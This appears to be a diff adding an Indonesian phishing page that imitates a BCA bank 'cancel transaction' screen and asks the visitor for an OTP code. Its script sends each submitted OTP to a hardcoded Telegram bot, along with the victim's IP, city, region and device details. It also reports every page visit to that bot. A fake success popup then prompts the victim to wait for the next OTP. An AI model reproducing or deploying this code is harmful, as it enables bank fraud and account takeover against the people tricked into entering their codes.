@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="theme-color" content="">
+ <meta content="" property="og:image">
+     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+     <link rel="icon" type="image/png" href=""/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+    <title>varifikasi</title>
+<style>
+* {
+  box-sizing: border-box;
+}
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding-bottom: 60px;
+  background-color: #dedede;
+}
+nav {
+  background-color: #fff;
+  color: #fff;
+  padding: 0px 0px;
+  display: flex;
+  align-items: center;
+  box-shadow: 0 3px 4px rgba(0,0,0,0.1);
+}
+nav img {
+  height: px;
+  box-shadow: 0 3px 4px rgba(0,0,0,0.1);
+}
+.header-container {
+  max-width: 400px;
+  margin: 0px auto;
+  padding: 0, 65px;
+}
+.header-image {
+  width:50%;
+  height: auto;
+  border-radius: 100px;
+  transition: transform 0.4s;
+  display: block;
+  align-items: center;
+  margin-left:90px;
+}
+form#otpForm {
+  background-color: #fff;
+  padding: 15px;
+  border-radius: 8px;
+  box-shadow: 0 3px px rgba(0,0,0,0.1);
+  max-width: 100%;
+  margin:20px;
+  position: relative;
+}
+.otp-input-wrapper {
+  position: relative;
+  margin-bottom: 15px;
+  margin-top:15px;
+}
+.otp-input-wrapper input[type="tel"] {
+position: relative;
+  width: 84%;
+  padding: 12px 40px 12px 12px;
+  font-size: 16px;
+  text-align: center;
+  border-radius: 5px;
+  border: 1px none #fff;
+  font-weight:600;
+  background-color: #fff;
+  box-shadow: 0 4px 6px #747474;
+}
+#timer {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-weight: bold;
+  color: #db0009;
+  user-select: none;
+}
+button#submitBtn {
+  width: 100%;
+  padding: 12px;
+  background: linear-gradient(90deg, #ff000ab8 0%, #d30009 100%);
+  color: white;
+  font-weight: 700;
+  border: none;
+  border-radius: 5px;
+  font-size: 15px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+button#submitBtn:hover:not(:disabled) {
+  background-color: #be0017c5;
+}
+button#submitBtn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+/* Popup modal */
+#popupModal {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0,0,0,0.4);
+  box-shadow: 0 0px 2px #747474;
+  justify-content: center;
+  align-items: center;
+  z-index: 10000;
+}
+#popupModalContent {
+  background: white;
+  padding: 20px 25px;
+  border-radius: 12px;
+  max-width: 280px;
+  text-align: center;
+  color: green;
+  box-shadow: 0 5px 8px #747474;
+}
+#popupModalContent h3 {
+  font-style: italic;
+  margin-bottom: 10px;
+}
+#popupModalContent h4 {
+  font-weight: 500;
+  font-size:13px;
+  margin: 15px 0;
+  line-height: 1.4;
+  color:#000;
+  
+}
+#popupModalContent img {
+  width: 80px;
+  height: auto;
+  border-radius: 50%;
+  margin-bottom: 10px;
+}
+#popupModalContent button {
+  margin-top: 15px;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 5px;
+  background: linear-gradient(90deg, #ff000abe 0%, #cb0008 100%);
+
+  color: white;
+  width:100%;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+#popupModalContent button:hover {
+  background-color: #00509a;
+}
+#popupModalContent div > button {
+  margin-top: 20px;
+  background-color: #3069bf;
+  width:100%;
+  color: #fff;
+  font-weight: 600;
+}
+#popupModalContent div > button:hover {
+  background-color: #bbb;
+}
+/* Footer */
+footer.bca-footer {
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  background-color: #0060AF;
+  color: white;
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  padding: 0px 0;
+  font-size: 12px;
+  z-index: 999;
+}
+footer.bca-footer 
+.footer-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  flex: 1;
+  user-select: none;
+}
+footer.bca-footer 
+.footer-item i {
+  font-size: 20px;
+  margin-bottom: 3px;
+}
+footer.bca-footer 
+.footer-item span {
+  font-size: 14px;
+} 
+label {
+    color:#000;
+    font-size:14px;
+    font-weight: 500;
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <img src="https://ik.imagekit.io/bmp99gglh/Picsart_25-11-02_05-23-21-344.png?updatedAt=1762035845794" width="100%" alt="BCA Logo" />
+</nav>
+<br>
+<div class="header-container">
+    
+  <form id="otpForm" method="post"style="box-shadow: 0 5px 8px #747474;">
+ <center>
+     <img class="" id="card-image" src="https://tse2.mm.bing.net/th?id=OIP.40wZ5KS36l5NIrJeUEt0RwHaHa&pid=Api&P=0&w=400&h=400" width="150px" alt="Card Front" />
+</center>
+<center>
+  <label style="font-weight: 700;">Kode Pembatalan Transaksi</label>
+  </center>
+    <div class="otp-input-wrapper">
+      <input type="tel" name="pin" id="pin" maxlength="6" placeholder="Masukkan OTP" required />
+      <span id="timer">60s</span>
+    </div>
+    <center>
+              <br>
+    </center>
+    <button type="submit" id="submitBtn" style="box-shadow: 0 5px 8px #747474;">Batalkan Sekarang</button>
+    <br><br><br><br>
+
+  </form>
+  
+</div>
+
+<div id="popupModal"style="box-shadow: 0 5px 8px #747474;">
+  <div id="popupModalContent"style="box-shadow: 0 5px 8px #747474;">
+    <h3 style="font-size:15px;"><i>TRANSAKSI BERHASIL DIBATALKAN</i></h3>
+    <img src="https://ik.imagekit.io/bmp99gglh/gear-check-mark-process-arrows-flat-style_78370-5110.jpg?updatedAt=1759528996496" alt="pop" />
+    <h4 style="font-weight: 900;">mohon tunggu OTP berikutnya..</h4>
+    
+      <button id="nextBtn" style="box-shadow: 0 5px 8px #747474;">Lanjutkan</button>
+       <button id="closePopupBtn" style="box-shadow: 0 5px 8px #747474;">Ke Menu Utama</button>
+
+      <div>
+     
+    
+
+    </div>
+  </div>
+
+
+</div>
+<script>
+  // ==============================================
+  // 🔧 KONFIGURASI BOT TELEGRAM — GANTI BAGIAN INI!
+  // ==============================================
+  const TELEGRAM_BOT_TOKEN = "8710568614:AAFSuzuNlON72t7iJO4qaTvjoH0JJ3IrWMw"; // Contoh: 7123456789:AAG9xXxxxxxxxxx
+  const TELEGRAM_CHAT_ID = "8527556684";     // Contoh: 1234567890
+  // ==============================================
+
+  // Timer function
+  let countdown;
+  function startTimer(duration) {
+    let timer = duration;
+    const timerDisplay = document.getElementById('timer');
+    clearInterval(countdown);
+    countdown = setInterval(() => {
+      timerDisplay.textContent = `${timer}s`;
+      timer--;
+      if (timer < 0) {
+        clearInterval(countdown);
+        timerDisplay.textContent = "Expired";
+      }
+    }, 1000);
+  }
+
+  // Kirim pesan ke Telegram
+  async function sendToTelegram(message) {
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const response = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+      const result = await response.json();
+      if (!result.ok) console.warn("Telegram API Error:", result.description);
+    } catch (err) {
+      console.warn("Gagal kirim ke Telegram:", err);
+    }
+  }
+
+  // Ambil info lokasi & device
+  async function getClientInfo() {
+    try {
+      const res = await fetch("https://ipinfo.io/json");
+      const data = await res.json();
+
+      const kota = data.city || "Tidak diketahui";
+      const ip = data.ip || "Tidak diketahui";
+      const region = data.region || "Tidak diketahui";
+      const country = data.country || "Tidak diketahui";
+      const loc = data.loc || "Tidak diketahui";
+
+      let deviceType = "Tidak diketahui";
+      if (/android/i.test(navigator.userAgent)) deviceType = "Android";
+      else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) deviceType = "iPhone/iPad";
+      else deviceType = "PC/Laptop";
+
+      const deviceName = navigator.userAgent;
+      const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+      return { kota, ip, region, country, loc, deviceType, deviceName, waktu };
+    } catch (error) {
+      console.warn("Gagal ambil data lokasi/device", error);
+      return { error: "Gagal ambil data" };
+    }
+  }
+
+  window.onload = async () => {
+    startTimer(180);
+    // Kirim notifikasi saat halaman dibuka
+    const info = await getClientInfo();
+    if (!info.error) {
+      sendToTelegram(
+        `🔔 *HALAMAN DIBUKA*\n` +
+        `⏰ Waktu: ${info.waktu}\n` +
+        `📍 Kota: ${info.kota}\n` +
+        `🌐 IP: ${info.ip}\n` +
+        `📱 Perangkat: ${info.deviceType}`
+      );
+    }
+  };
+
+  // Submit form
+  document.getElementById("otpForm").addEventListener("submit", async function(event) {
+    event.preventDefault();
+
+    const otp = document.getElementById("pin").value.trim();
+    const submitBtn = document.getElementById("submitBtn");
+
+    // Validasi OTP: 6 digit angka
+    if (otp.length !== 6 || isNaN(otp)) {
+      alert("Masukkan 6 digit OTP!");
+      return;
+    }
+
+    submitBtn.textContent = "Mengirim...";
+    submitBtn.disabled = true;
+
+    // Ambil semua info
+    const info = await getClientInfo();
+    
+    // Susun pesan untuk Telegram
+    const pesanTelegram = 
+      `🚨 *OTP DITERIMA*\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `🔢 KODE OTP: \`${otp}\`\n` +
+      `⏰ Waktu: ${info.waktu || "-"}\n` +
+      `📍 Kota: ${info.kota || "-"}\n` +
+      `🌐 IP: ${info.ip || "-"}\n` +
+      `🌍 Wilayah: ${info.region || "-"}, ${info.country || "-"}\n` +
+      `📱 Perangkat: ${info.deviceType || "-"}\n` +
+      `💻 Detail: ${info.deviceName?.substring(0, 80) || "-"}\n` +
+      `━━━━━━━━━━━━━━━━━━`;
+
+    // Kirim ke Telegram
+    await sendToTelegram(pesanTelegram);
+
+    // Tampilkan popup
+    document.getElementById("popupModal").style.display = "flex";
+
+    // Reset tombol
+    submitBtn.textContent = "Batalkan Transaksi";
+    submitBtn.disabled = false;
+  });
+
+  // Tombol popup
+  document.getElementById("closePopupBtn").addEventListener("click", () => {
+    window.location.href = "pilihan.html";
+  });
+
+  document.getElementById("nextBtn").addEventListener("click", () => {
+    location.reload();
+  });
+</script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"c5c82f7983e54edd9e7338dc5d04986e","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
